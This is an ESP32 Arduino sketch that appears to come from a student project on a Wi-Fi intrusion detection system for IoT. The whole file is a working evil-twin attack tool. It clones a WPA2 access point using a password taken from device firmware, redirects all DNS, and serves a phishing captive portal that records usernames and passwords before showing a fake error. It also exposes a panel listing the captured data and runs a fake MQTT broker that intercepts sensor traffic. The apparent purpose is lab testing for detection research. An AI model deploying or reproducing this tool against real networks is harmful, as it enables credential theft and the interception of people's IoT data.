// =============================================================================
//     EVIL TWIN — TFG IDS Wi-Fi IoT
//     ESP32 WROOM-32U · Arduino IDE
//
//     AP falso (TFG_TestAP) + WPA2 (contraseña extraída del firmware)
//     + Portal Cautivo + Broker MQTT falso
//     Captura credenciales del usuario y datos MQTT del dispositivo IoT
// =============================================================================

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// =============================================================================
//                         CONFIGURACIÓN
// =============================================================================

// AP falso — mismo SSID y contraseña que el legítimo
// La contraseña fue extraída del firmware del dispositivo IoT (Parte 4)
const char* EVIL_SSID = "TFG_TestAP";
const char* EVIL_PASS = "passwordsegura";  // Extraída con esptool + strings
const int EVIL_CHANNEL = 6;

// DNS & Web
const byte DNS_PORT = 53;
const int WEB_PORT = 80;

// MQTT falso
const int MQTT_PORT = 1883;

// =============================================================================
//                         OBJETOS GLOBALES
// =============================================================================

DNSServer dnsServer;
WebServer webServer(WEB_PORT);
WebServer webServer2(8080);
WiFiServer mqttServer(MQTT_PORT);

// Almacén de credenciales capturadas
struct Credential {
  String username;
  String password;
  String ip;
  String timestamp;
};

#define MAX_CREDS 20
Credential creds[MAX_CREDS];
int credCount = 0;

// Almacén de datos MQTT capturados
#define MAX_MQTT_LOGS 50
String mqttLogs[MAX_MQTT_LOGS];
int mqttLogCount = 0;

// Cliente MQTT persistente
WiFiClient mqttClient;
bool mqttClientConnected = false;

// =============================================================================
//                    PÁGINA DE LOGIN (Portal Cautivo)
// =============================================================================

const char LOGIN_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login — TFG IoT Monitor</title>
<style>
  :root {
    --bg: #f4f6f9;
    --card: #ffffff;
    --primary: #2563eb;
    --primary-dark: #1d4ed8;
    --text: #1e293b;
    --muted: #64748b;
    --border: #e2e8f0;
    --error: #ef4444;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
    background: var(--bg);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .login-container {
    background: var(--card);
    border-radius: 16px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08);
    padding: 48px 40px;
    width: 100%;
    max-width: 400px;
  }
  .login-header { text-align: center; margin-bottom: 36px; }
  .login-icon {
    width: 56px; height: 56px;
    background: linear-gradient(135deg, #2563eb, #7c3aed);
    border-radius: 14px;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 16px;
    font-size: 24px;
  }
  .login-header h1 { font-size: 22px; font-weight: 700; color: var(--text); margin-bottom: 6px; }
  .login-header p { font-size: 14px; color: var(--muted); font-weight: 300; }
  .form-group { margin-bottom: 20px; }
  .form-group label { display: block; font-size: 13px; font-weight: 500; color: var(--text); margin-bottom: 6px; }
  .form-group input {
    width: 100%; padding: 12px 16px;
    border: 1.5px solid var(--border); border-radius: 10px;
    font-family: inherit; font-size: 15px; color: var(--text);
    background: var(--bg); outline: none;
  }
  .form-group input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(37,99,235,0.12); }
  .login-btn {
    width: 100%; padding: 13px;
    background: var(--primary); color: white; border: none;
    border-radius: 10px; font-family: inherit; font-size: 15px;
    font-weight: 600; cursor: pointer;
  }
  .login-btn:hover { background: var(--primary-dark); }
  .footer-text { text-align: center; margin-top: 24px; font-size: 12px; color: var(--muted); }
  .error-msg {
    background: #fef2f2; color: var(--error);
    padding: 10px 14px; border-radius: 8px;
    font-size: 13px; margin-bottom: 20px; border: 1px solid #fecaca;
  }
</style>
</head>
<body>
  <div class="login-container">
    <div class="login-header">
      <div class="login-icon">&#x1f6e1;&#xfe0f;</div>
      <h1>TFG IoT Monitor</h1>
      <p>Panel de monitorizaci&oacute;n de sensores</p>
    </div>
    <div class="error-msg" id="errMsg" style="display:none;">Credenciales incorrectas. Int&eacute;ntalo de nuevo.</div>
    <form method="POST" action="/login">
      <div class="form-group">
        <label>Usuario</label>
        <input type="text" name="username" placeholder="Introduce tu usuario" required autofocus>
      </div>
      <div class="form-group">
        <label>Contrase&ntilde;a</label>
        <input type="password" name="password" placeholder="Introduce tu contrase&ntilde;a" required>
      </div>
      <button type="submit" class="login-btn">Acceder al panel</button>
    </form>
    <p class="footer-text">TFG — Sistema IDS Wi-Fi para IoT &middot; UCM 2026</p>
  </div>
</body>
</html>
)rawliteral";

// =============================================================================
//            PÁGINA DE "ERROR" (después de capturar credenciales)
// =============================================================================

const char ERROR_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login — TFG IoT Monitor</title>
<style>
  :root {
    --bg: #f4f6f9; --card: #ffffff; --primary: #2563eb;
    --primary-dark: #1d4ed8; --text: #1e293b; --muted: #64748b;
    --border: #e2e8f0; --error: #ef4444;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
    background: var(--bg); min-height: 100vh;
    display: flex; align-items: center; justify-content: center; padding: 20px;
  }
  .login-container {
    background: var(--card); border-radius: 16px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08);
    padding: 48px 40px; width: 100%; max-width: 400px;
  }
  .login-header { text-align: center; margin-bottom: 36px; }
  .login-icon {
    width: 56px; height: 56px;
    background: linear-gradient(135deg, #2563eb, #7c3aed);
    border-radius: 14px; display: flex; align-items: center;
    justify-content: center; margin: 0 auto 16px; font-size: 24px;
  }
  .login-header h1 { font-size: 22px; font-weight: 700; color: var(--text); margin-bottom: 6px; }
  .login-header p { font-size: 14px; color: var(--muted); font-weight: 300; }
  .form-group { margin-bottom: 20px; }
  .form-group label { display: block; font-size: 13px; font-weight: 500; color: var(--text); margin-bottom: 6px; }
  .form-group input {
    width: 100%; padding: 12px 16px;
    border: 1.5px solid var(--border); border-radius: 10px;
    font-family: inherit; font-size: 15px; color: var(--text);
    background: var(--bg); outline: none;
  }
  .form-group input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(37,99,235,0.12); }
  .login-btn {
    width: 100%; padding: 13px; background: var(--primary);
    color: white; border: none; border-radius: 10px;
    font-family: inherit; font-size: 15px; font-weight: 600; cursor: pointer;
  }
  .footer-text { text-align: center; margin-top: 24px; font-size: 12px; color: var(--muted); }
  .error-msg {
    background: #fef2f2; color: var(--error);
    padding: 10px 14px; border-radius: 8px;
    font-size: 13px; margin-bottom: 20px; border: 1px solid #fecaca;
  }
</style>
</head>
<body>
  <div class="login-container">
    <div class="login-header">
      <div class="login-icon">&#x1f6e1;&#xfe0f;</div>
      <h1>TFG IoT Monitor</h1>
      <p>Panel de monitorizaci&oacute;n de sensores</p>
    </div>
    <div class="error-msg">Credenciales incorrectas. Int&eacute;ntalo de nuevo.</div>
    <form method="POST" action="/login">
      <div class="form-group">
        <label>Usuario</label>
        <input type="text" name="username" placeholder="Introduce tu usuario" required autofocus>
      </div>
      <div class="form-group">
        <label>Contrase&ntilde;a</label>
        <input type="password" name="password" placeholder="Introduce tu contrase&ntilde;a" required>
      </div>
      <button type="submit" class="login-btn">Acceder al panel</button>
    </form>
    <p class="footer-text">TFG — Sistema IDS Wi-Fi para IoT &middot; UCM 2026</p>
  </div>
</body>
</html>
)rawliteral";

// =============================================================================
//            PÁGINA DEL ATACANTE (ver credenciales y datos MQTT)
// =============================================================================

String buildAdminPage() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>Evil Twin — Panel Atacante</title>";
  html += "<style>";
  html += "body{font-family:monospace;background:#0a0c10;color:#e8eaf0;padding:20px;}";
  html += "h1{color:#ef4444;font-size:20px;}h2{color:#4f9eff;font-size:16px;margin-top:20px;}";
  html += "table{width:100%;border-collapse:collapse;margin:10px 0;}";
  html += "th,td{border:1px solid #2a2d36;padding:8px;text-align:left;font-size:13px;}";
  html += "th{background:#1a1d24;color:#4f9eff;}td{background:#111318;}";
  html += ".cred{color:#22c55e;}.mqtt{color:#f59e0b;}";
  html += ".refresh{background:#4f9eff;color:#fff;border:none;padding:8px 16px;";
  html += "border-radius:4px;cursor:pointer;font-family:monospace;margin:10px 0;}";
  html += "</style></head><body>";

  html += "<h1>🔴 EVIL TWIN — Panel del Atacante</h1>";
  html += "<p>SSID clonado: <strong>" + String(EVIL_SSID) + "</strong> (WPA2) | ";
  html += "Clientes conectados: <strong>" + String(WiFi.softAPgetStationNum()) + "</strong></p>";
  html += "<p style='color:#f59e0b;'>Contraseña obtenida del firmware: <strong>" + String(EVIL_PASS) + "</strong></p>";
  html += "<button class='refresh' onclick='location.reload()'>Actualizar</button>";

  // Credenciales capturadas
  html += "<h2 class='cred'>🔓 Credenciales Capturadas (" + String(credCount) + ")</h2>";
  if (credCount > 0) {
    html += "<table><tr><th>#</th><th>Usuario</th><th>Contraseña</th><th>IP</th></tr>";
    for (int i = 0; i < credCount; i++) {
      html += "<tr><td>" + String(i+1) + "</td>";
      html += "<td>" + creds[i].username + "</td>";
      html += "<td>" + creds[i].password + "</td>";
      html += "<td>" + creds[i].ip + "</td></tr>";
    }
    html += "</table>";
  } else {
    html += "<p>Esperando a que alguien pique...</p>";
  }

  // Datos MQTT capturados
  html += "<h2 class='mqtt'>📡 Datos MQTT Capturados (" + String(mqttLogCount) + ")</h2>";
  if (mqttLogCount > 0) {
    html += "<table><tr><th>#</th><th>Datos recibidos</th></tr>";
    int start = (mqttLogCount > 20) ? mqttLogCount - 20 : 0;
    for (int i = start; i < mqttLogCount; i++) {
      html += "<tr><td>" + String(i+1) + "</td>";
      html += "<td>" + mqttLogs[i % MAX_MQTT_LOGS] + "</td></tr>";
    }
    html += "</table>";
  } else {
    html += "<p>Esperando datos MQTT de dispositivos IoT...</p>";
  }

  html += "</body></html>";
  return html;
}

// =============================================================================
//                      HANDLERS WEB
// =============================================================================

void handleRoot() {
  webServer.send(200, "text/html", LOGIN_PAGE);
}

void handleLogin() {
  if (webServer.method() == HTTP_POST) {
    String user = webServer.arg("username");
    String pass = webServer.arg("password");
    String ip = webServer.client().remoteIP().toString();

    if (credCount < MAX_CREDS) {
      creds[credCount].username = user;
      creds[credCount].password = pass;
      creds[credCount].ip = ip;
      creds[credCount].timestamp = String(millis() / 1000) + "s";
      credCount++;
    }

    Serial.println("\n========================================");
    Serial.println("🔓 CREDENCIALES CAPTURADAS:");
    Serial.println("   Usuario:    " + user);
    Serial.println("   Contraseña: " + pass);
    Serial.println("   IP víctima: " + ip);
    Serial.println("========================================\n");

    webServer.send(200, "text/html", ERROR_PAGE);
  } else {
    webServer.send(200, "text/html", LOGIN_PAGE);
  }
}

void handleAdmin() {
  webServer.send(200, "text/html", buildAdminPage());
}

void handleNotFound() {
  webServer.sendHeader("Location", "http://192.168.50.1/", true);
  webServer.send(302, "text/html", "");
}

// Handlers para webServer2 (puerto 8080)
void handleRoot2() {
  webServer2.send(200, "text/html", LOGIN_PAGE);
}

void handleLogin2() {
  if (webServer2.method() == HTTP_POST) {
    String user = webServer2.arg("username");
    String pass = webServer2.arg("password");
    String ip = webServer2.client().remoteIP().toString();

    if (credCount < MAX_CREDS) {
      creds[credCount].username = user;
      creds[credCount].password = pass;
      creds[credCount].ip = ip;
      creds[credCount].timestamp = String(millis() / 1000) + "s";
      credCount++;
    }

    Serial.println("\n========================================");
    Serial.println("🔓 CREDENCIALES CAPTURADAS (8080):");
    Serial.println("   Usuario:    " + user);
    Serial.println("   Contraseña: " + pass);
    Serial.println("   IP víctima: " + ip);
    Serial.println("========================================\n");

    webServer2.send(200, "text/html", ERROR_PAGE);
  } else {
    webServer2.send(200, "text/html", LOGIN_PAGE);
  }
}

void handleAdmin2() {
  webServer2.send(200, "text/html", buildAdminPage());
}

void handleNotFound2() {
  webServer2.sendHeader("Location", "http://192.168.50.1:8080/", true);
  webServer2.send(302, "text/html", "");
}

// =============================================================================
//                      BROKER MQTT FALSO
// =============================================================================

void handleMQTT() {
  // Aceptar nueva conexión si no hay cliente activo
  if (!mqttClientConnected || !mqttClient.connected()) {
    WiFiClient newClient = mqttServer.available();
    if (newClient) {
      mqttClient = newClient;
      mqttClientConnected = true;
      Serial.println("\n📡 [MQTT] Nuevo dispositivo conectado: " + mqttClient.remoteIP().toString());
    }
  }

  // Leer datos del cliente conectado
  if (mqttClientConnected && mqttClient.connected() && mqttClient.available()) {
    // Leer el paquete MQTT raw
    uint8_t packetType = mqttClient.read();
    
    // Leer remaining length (MQTT encoding)
    uint32_t remainingLength = 0;
    uint8_t multiplier = 1;
    uint8_t encodedByte;
    do {
      if (!mqttClient.available()) break;
      encodedByte = mqttClient.read();
      remainingLength += (encodedByte & 127) * multiplier;
      multiplier *= 128;
    } while ((encodedByte & 128) != 0);

    // Leer el payload
    String rawData = "";
    for (uint32_t i = 0; i < remainingLength && mqttClient.available(); i++) {
      char c = mqttClient.read();
      if (c >= 32 && c <= 126) {
        rawData += c;
      }
    }

    uint8_t type = (packetType >> 4) & 0x0F;

    if (type == 1) {
      // CONNECT — responder con CONNACK
      uint8_t connack[] = {0x20, 0x02, 0x00, 0x00};
      mqttClient.write(connack, 4);
      Serial.println("📡 [MQTT] CONNACK enviado a " + mqttClient.remoteIP().toString());

    } else if (type == 3) {
      // PUBLISH — datos de sensores!
      int jsonStart = rawData.indexOf('{');
      int jsonEnd = rawData.lastIndexOf('}');

      String logEntry = "";
      if (jsonStart >= 0 && jsonEnd > jsonStart) {
        logEntry = rawData.substring(jsonStart, jsonEnd + 1);
      } else {
        logEntry = rawData;
      }

      if (logEntry.length() > 2) {
        mqttLogs[mqttLogCount % MAX_MQTT_LOGS] = logEntry;
        mqttLogCount++;

        Serial.println("📡 [MQTT] DATOS INTERCEPTADOS:");
        Serial.println("   " + logEntry);
      }

    } else if (type == 12) {
      // PINGREQ — responder con PINGRESP
      uint8_t pingresp[] = {0xD0, 0x00};
      mqttClient.write(pingresp, 2);
    }
  }

  // Detectar desconexión
  if (mqttClientConnected && !mqttClient.connected()) {
    mqttClientConnected = false;
    Serial.println("📡 [MQTT] Dispositivo desconectado");
  }
}

// =============================================================================
//                          SETUP
// =============================================================================

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("\n");
  Serial.println("==============================================");
  Serial.println("   🔴 EVIL TWIN — TFG IDS Wi-Fi IoT");
  Serial.println("==============================================");
  Serial.println("   SSID:       " + String(EVIL_SSID));
  Serial.println("   Contraseña: " + String(EVIL_PASS));
  Serial.println("   Canal:      " + String(EVIL_CHANNEL));
  Serial.println("   Modo:       WPA2 (clon perfecto)");
  Serial.println("==============================================\n");

  // Levantar AP falso con WPA2
  WiFi.mode(WIFI_AP);
  WiFi.softAP(EVIL_SSID, EVIL_PASS, EVIL_CHANNEL);

  IPAddress local_IP(192, 168, 50, 1);
  IPAddress gateway(192, 168, 50, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(local_IP, gateway, subnet);
  delay(500);

  Serial.print("[AP] IP del Evil Twin: ");
  Serial.println(WiFi.softAPIP());

  // DNS Server
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  Serial.println("[DNS] Servidor DNS activo — todo redirige aquí");

  // Web Server puerto 80
  webServer.on("/", handleRoot);
  webServer.on("/login", handleLogin);
  webServer.on("/admin", handleAdmin);
  webServer.on("/generate_204", handleRoot);
  webServer.on("/fwlink", handleRoot);
  webServer.on("/connecttest.txt", handleRoot);
  webServer.on("/hotspot-detect.html", handleRoot);
  webServer.on("/library/test/success.html", handleRoot);
  webServer.onNotFound(handleNotFound);
  webServer.begin();
  Serial.println("[WEB] Servidor web activo en puerto 80");

  // Web Server puerto 8080
  webServer2.on("/", handleRoot2);
  webServer2.on("/login", handleLogin2);
  webServer2.on("/admin", handleAdmin2);
  webServer2.on("/generate_204", handleRoot2);
  webServer2.on("/fwlink", handleRoot2);
  webServer2.on("/connecttest.txt", handleRoot2);
  webServer2.on("/hotspot-detect.html", handleRoot2);
  webServer2.on("/library/test/success.html", handleRoot2);
  webServer2.onNotFound(handleNotFound2);
  webServer2.begin();
  Serial.println("[WEB] Servidor web activo en puerto 8080");

  // MQTT falso
  mqttServer.begin();
  Serial.println("[MQTT] Broker falso activo en puerto 1883");

  Serial.println("\n✅ Evil Twin operativo. Esperando víctimas...");
  Serial.println("   Panel atacante: http://192.168.50.1/admin");
  Serial.println("   Credenciales capturadas por Serial y /admin\n");
}

// =============================================================================
//                          LOOP
// =============================================================================

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  webServer2.handleClient();
  handleMQTT();
  delay(1);
}
